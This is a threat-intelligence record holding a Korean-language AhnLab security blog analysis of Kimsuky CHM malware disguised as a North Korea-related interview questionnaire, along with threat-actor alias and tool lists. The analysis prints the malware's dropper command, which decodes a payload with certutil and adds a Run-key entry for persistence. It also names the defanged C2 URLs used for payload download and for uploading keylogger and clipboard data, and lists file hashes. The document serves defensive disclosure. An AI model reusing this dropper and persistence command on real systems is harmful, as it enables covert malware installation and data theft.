{
    "id": "6c7f97a6-8dac-441e-b4e7-d9be0d2fe55d",
    "created_at": "2023-04-05T02:08:58.868412Z",
    "updated_at": "2025-03-27T02:16:55.580481Z",
    "deleted_at": null,
    "sha1_hash": "2a898c93521392c341fe11c7855e070ddb9607d0",
    "title": "2023-03-08 - CHM malware (Kimsuky) disguised questionnaires related to North Korea",
    "authors": "",
    "file_creation_date": "2023-04-03T08:31:46Z",
    "file_modification_date": "2023-04-03T08:31:46Z",
    "file_size": 1974819,
    "plain_text": "# 대북 관련 질문지를 위장한 CHM 악성코드 (Kimsuky)\n\n**asec.ahnlab.com/ko/48960/**\n\nBy ye_eun 2023년 3월 8일\n\nASEC(AhnLab Security Emergency response Center)은 최근 Kimsuky 그룹에서 제작한 것으\n로 추정되는 CHM 악성코드를 확인하였다. 해당 악성코드 유형은 아래 ASEC 블로그 및\nKimsuky 그룹 유포 악성코드 분석 보고서에서 소개한 악성코드와 동일하며 사용자 정보 유출\n을 목적으로 한다.\n\nCHM 파일은 압축 파일 형태로 이메일에 첨부되어 유포된다. 원문 메일에는 대북 관련 내용의\n인터뷰 요청으로 위장하였으며 메일 수신인이 이를 수락할 경우 암호가 설정된 압축 파일을\n첨부하여 회신한다. 이는 기존에 분석된 내용과 유사하게 대북 관련 인터뷰를 위장하고 있을\n뿐만 아니라 사용자가 메일에 회신한 경우에만 악성 파일을 전달하는 동일한 방식을 사용했\n다.\n\n\n-----\n\n그림 1. 유포 이메일\n\n\n-----\n\n그림 2. 이메일 원문\n\n그림 3. 압축 파일 내부\n\n인터뷰 질의문(***).chm 파일 실행 시 아래와 같이 실제 질문이 작성된 도움말 창이 나타나 사\n용자가 악성 파일임을 알아차리기 어렵다.\n\n\n-----\n\n그림 4. 질문지로 위장한 CHM\n\nCHM에는 악성 스크립트가 존재하며 이전에 소개된 CHM 악성코드들과 동일하게 바로가기\n객체(ShortCut)를 이용하였다. 바로가기 객체는 Click 메서드를 통해 호출되며 Item1 항목에\n존재하는 명령어가 실행된다. ‘인터뷰 질의문(***).chm’ 을 통해 실행되는 명령어는 다음과 같\n다.\n\n실행 명령어\n\ncmd, /c echo [인코딩된 명령어] > “%USERPROFILE%\\Links\\Document.dat” & start\n/MIN certutil -decode “%USERPROFILE%\\Links\\Document.dat”\n“%USERPROFILE%\\Links\\Document.vbs” & start /MIN REG ADD\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Document /t REG_SZ /d\n“%USERPROFILE%\\Links\\Document.vbs” /f’\n\n\n-----\n\n그림 5. CHM 내 악성 스크립트\n\n따라서 CHM 실행 시 인코딩된 명령어가 %USERPROFILE%\\Links\\Document.dat 에 저장되\n고 Certutil을 이용하여 디코딩한 명령어를 %USERPROFILE%\\Links\\Document.vbs에 저장한\n다. 공격자는 또한 Document.vbs를 Run 키\n(HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run)에 등록하여 악성 스크립트가\n지속적으로 실행될 수 있도록 하였다. 최종적으로 Document.vbs는\nhxxp://mpevalr.ria[.]monster/SmtInfo/demo.txt의 파워쉘 스크립트 코드를 실행한다.\n\n그림 6. (위) Document.vbs 코드 일부 / (아래) 기존 보고서에서 확인된 vbs 코드 일부\n\nDocument.vbs에서 연결하는 URL은 현재 접속되지 않지만, 해당 주소에서 다운로드 된 것으\n로 추정되는 스크립트가 확인되었다. 확인된 스크립트 파일은 사용자의 키 입력을 가로채 특\n정 파일에 저장한 후 공격자에게 전송하는 기능을 수행한다. 현재 작업 중인\n\n\n-----\n\nForegroundWindow의 캡션을 읽어와 키로깅을 수행할 뿐만 아니라 Clipboard 내용을 주기적\n으로 확인하여 %APPDATA%\\Microsoft\\Windows\\Templates\\Pages_Elements.xml 파일에 저\n장한다. 이후 해당 파일을 hxxp://mpevalr.ria[.]monster/SmtInfo/show.php 로 전송한다.\n\n그림 7. (위) demo.txt 일부 / (아래) 기존 보고서에서 파워쉘 스크립트 코드 일부\n\n[그림 6]과 [그림 7]에서 알 수 있듯이 Document.vbs(VBS 스크립트 파일)와 demo.txt(파워쉘\n스크립트 파일)은 지난해 ATIP에서 공개한 ‘Kimsuky 그룹 유포 악성코드 분석 보고서’에서 분\n석한 악성코드와 동일한 형태이다. 이를 바탕으로 Kimsuky 그룹은 워드 문서 외에도 CHM와\n같이 다양한 형태의 악성 파일을 첨부한 피싱 메일을 유포하는 것으로 확인되고 있어, 사용자\n들의 각별한 주의가 요구된다.\n\n**[파일** 진단]\n\nDropper/CHM.Generic (2023.03.07.00)\n\nData/BIN.Encoded (2023.03.07.00)\n\nDownloader/VBS.Agent.SC186747 (2023.03.07.00)\n\nTrojan/PowerShell.Agent.SC186246 (2023.02.09.00)\n\n**[행위** 진단]\n\nExecution/MDP.Cmd.M4230\n\n\n-----\n\n**[IOC]**\n**MD5**\n\n726af41024d06df195784ae88f2849e4 (chm)\n\n0f41d386e30e9f5ae5be4a707823fd78 (dat)\n\n89c0e93813d3549efe7274a0b9597f6f (vbs)\n\n9f560c90b7ba6f02233094ed03d9272e\n\n**C2**\n\nhxxp://mpevalr.ria[.]monster/SmtInfo/demo.txt\nhxxp://mpevalr.ria[.]monster/SmtInfo/show.php\n\n연관 IOC 및 관련 상세 분석 정보는 안랩의 차세대 위협 인텔리전스 플랫폼 ‘AhnLab TIP’ 구\n독 서비스를 통해 확인 가능하다.\n\n[Categories:악성코드](https://asec.ahnlab.com/ko/category/malware-information/) 정보\n\n[Tagged as:chm,Kimsuky](https://asec.ahnlab.com/ko/tag/chm/)\n\n\n-----",
    "language": "KO",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-08 - CHM malware (Kimsuky) disguised questionnaires related to North Korea.pdf"
    ],
    "report_names": [
        "2023-03-08 - CHM malware (Kimsuky) disguised questionnaires related to North Korea.pdf"
    ],
    "threat_actors": [
        {
            "id": "dc78f675-b309-431d-8160-b8dcff037d4f",
            "created_at": "2024-05-01T02:03:08.142224Z",
            "updated_at": "2025-03-27T02:05:17.417972Z",
            "deleted_at": null,
            "main_name": "NICKEL KIMBALL",
            "aliases": [
                "Black Banshee ",
                "Crooked Pisces ",
                "Emerald Sleet ",
                "Kimsuky ",
                "Opal Sleet ",
                "SharpTongue ",
                "TA427 ",
                "THALLIUM ",
                "Velvet Chollima ",
                "APT43 "
            ],
            "source_name": "Secureworks:NICKEL KIMBALL",
            "tools": [
                " KONNI",
                " KimJongRAT",
                " Kimsuky",
                "BabyShark"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "760f2827-1718-4eed-8234-4027c1346145",
            "created_at": "2023-01-06T13:46:38.670947Z",
            "updated_at": "2025-03-27T02:00:02.888195Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Thallium",
                "G0086",
                "APT43",
                "Springtail",
                "Sparkling Pisces",
                "Velvet Chollima",
                "Black Banshee",
                "Operation Stolen Pencil",
                "Emerald Sleet",
                "THALLIUM"
            ],
            "source_name": "MISPGALAXY:Kimsuky",
            "tools": [
                "RevClient",
                "xrat",
                "QUASARRAT",
                "RDP Wrapper",
                "TightVNC",
                "BabyShark"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "191d7f9a-8c3c-442a-9f13-debe259d4cc2",
            "created_at": "2022-10-25T15:50:23.280374Z",
            "updated_at": "2025-03-27T02:00:55.423485Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Kimsuky",
                "Black Banshee",
                "Velvet Chollima",
                "Emerald Sleet",
                "THALLIUM",
                "APT43",
                "TA427"
            ],
            "source_name": "MITRE:Kimsuky",
            "tools": [
                "schtasks",
                "Amadey",
                "Brave Prince",
                "CSPY Downloader",
                "gh0st RAT",
                "AppleSeed",
                "NOKKI",
                "QuasarRAT",
                "Gold Dragon",
                "PsExec",
                "KGH_SPY",
                "Mimikatz",
                "BabyShark"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "71a1e16c-3ba6-4193-be62-be53527817bc",
            "created_at": "2022-10-25T16:07:23.753455Z",
            "updated_at": "2025-03-27T02:02:09.963016Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "APT 43",
                "Black Banshee",
                "Emerald Sleet",
                "ITG16",
                "KTA082",
                "Kimsuky",
                "Larva-24005",
                "Operation Baby Coin",
                "Operation Covert Stalker",
                "Operation DEEP#DRIVE",
                "Operation DEEP#GOSU",
                "Operation Kabar Cobra",
                "Operation Mystery Baby",
                "Operation Red Salt",
                "Operation Smoke Screen",
                "Operation Stealth Power",
                "Operation Stolen Pencil",
                "SharpTongue",
                "Sparkling Pisces",
                "Springtail",
                "TA406",
                "TA427",
                "Thallium",
                "UAT-5394",
                "Velvet Chollima"
            ],
            "source_name": "ETDA:Kimsuky",
            "tools": [
                "AngryRebel",
                "AppleSeed",
                "BITTERSWEET",
                "BabyShark",
                "BoBoStealer",
                "CSPY Downloader",
                "Farfli",
                "FlowerPower",
                "Gh0st RAT",
                "Ghost RAT",
                "Gold Dragon",
                "GoldDragon",
                "GoldStamp",
                "JamBog",
                "KGH Spyware Suite",
                "KGH_SPY",
                "KPortScan",
                "KimJongRAT",
                "Kimsuky",
                "LATEOP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Lovexxx",
                "MailPassView",
                "Mechanical",
                "Mimikatz",
                "MoonPeak",
                "Moudour",
                "MyDogs",
                "Mydoor",
                "Network Password Recovery",
                "PCRat",
                "ProcDump",
                "PsExec",
                "ReconShark",
                "Remote Desktop PassView",
                "SHARPEXT",
                "SWEETDROP",
                "SmallTiger",
                "SniffPass",
                "TODDLERSHARK",
                "TRANSLATEXT",
                "Troll Stealer",
                "TrollAgent",
                "VENOMBITE",
                "WebBrowserPassView",
                "xRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1680660538,
    "ts_updated_at": 1743041815,
    "ts_creation_date": 1680510706,
    "ts_modification_date": 1680510706,
    "files": {
        "pdf": "https://archive.orkl.eu/2a898c93521392c341fe11c7855e070ddb9607d0.pdf",
        "text": "https://archive.orkl.eu/2a898c93521392c341fe11c7855e070ddb9607d0.txt",
        "img": "https://archive.orkl.eu/2a898c93521392c341fe11c7855e070ddb9607d0.jpg"
    }
}